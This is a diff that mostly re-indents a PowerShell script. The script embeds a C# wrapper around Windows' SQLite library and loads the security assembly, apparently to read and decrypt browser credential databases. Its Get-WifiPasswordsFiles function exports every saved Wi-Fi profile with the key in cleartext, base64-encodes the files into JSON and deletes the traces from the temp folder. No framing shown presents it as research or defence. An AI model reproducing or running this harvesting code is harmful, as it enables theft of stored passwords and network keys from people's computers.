@@ -1,52 +1,52 @@
 Add-Type -AssemblyName System.Security
 Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
+  using System;
+  using System.Runtime.InteropServices;
 
-    public class WinSQLite3
-    {
-        const string dll = "winsqlite3";
+  public class WinSQLite3
+  {
+    const string dll = "winsqlite3";
 
-        [DllImport(dll, EntryPoint="sqlite3_open")]
-        public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
+    [DllImport(dll, EntryPoint="sqlite3_open")]
+    public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
 
-        [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
-        public static extern IntPtr Prepare(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
+    [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
+    public static extern IntPtr Prepare(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
 
-        [DllImport(dll, EntryPoint="sqlite3_step")]
-        public static extern IntPtr Step(IntPtr stmt);
+    [DllImport(dll, EntryPoint="sqlite3_step")]
+    public static extern IntPtr Step(IntPtr stmt);
 
-        [DllImport(dll, EntryPoint="sqlite3_column_text16")]
-        static extern IntPtr ColumnText16(IntPtr stmt, int index);
+    [DllImport(dll, EntryPoint="sqlite3_column_text16")]
+    static extern IntPtr ColumnText16(IntPtr stmt, int index);
 
-        [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
-        static extern int ColumnBytes(IntPtr stmt, int index);
+    [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
+    static extern int ColumnBytes(IntPtr stmt, int index);
 
-        [DllImport(dll, EntryPoint="sqlite3_column_blob")]
-        static extern IntPtr ColumnBlob(IntPtr stmt, int index);
+    [DllImport(dll, EntryPoint="sqlite3_column_blob")]
+    static extern IntPtr ColumnBlob(IntPtr stmt, int index);
 
-        public static string ColumnString(IntPtr stmt, int index)
-        { 
-            return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
-        }
-
-        public static byte[] ColumnByteArray(IntPtr stmt, int index)
-        {
-            int length = ColumnBytes(stmt, index);
-            byte[] result = new byte[length];
-            if (length > 0)
-                Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
-            return result;
-        }
-
-        [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
-        public static extern IntPtr Errmsg(IntPtr db);
-
-        public static string GetErrmsg(IntPtr db)
-        {
-            return Marshal.PtrToStringUni(Errmsg(db));
-        }
+    public static string ColumnString(IntPtr stmt, int index)
+    { 
+      return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
     }
+
+    public static byte[] ColumnByteArray(IntPtr stmt, int index)
+    {
+      int length = ColumnBytes(stmt, index);
+      byte[] result = new byte[length];
+      if (length > 0)
+        Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
+      return result;
+    }
+
+    [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
+    public static extern IntPtr Errmsg(IntPtr db);
+
+    public static string GetErrmsg(IntPtr db)
+    {
+      return Marshal.PtrToStringUni(Errmsg(db));
+    }
+  }
 "@
 
 Function Get-Key {
@@ -130,8 +130,8 @@ function Get-WifiPasswordsFiles {
   cmd /c "del %temp%\*.xml /s /f /q & netsh wlan export profile key=clear folder=%temp%" | out-null
   Get-ChildItem -Path "$Env:Temp" -File -Filter "*.xml" |
   %{
-  $res.raw.Add($([Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))))
-  Remove-Item -Path "$($_.FullName)" -Force
+    $res.raw.Add($([Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))))
+    Remove-Item -Path "$($_.FullName)" -Force
   }
   return $($res | ConvertTo-Json -Compress)
 }
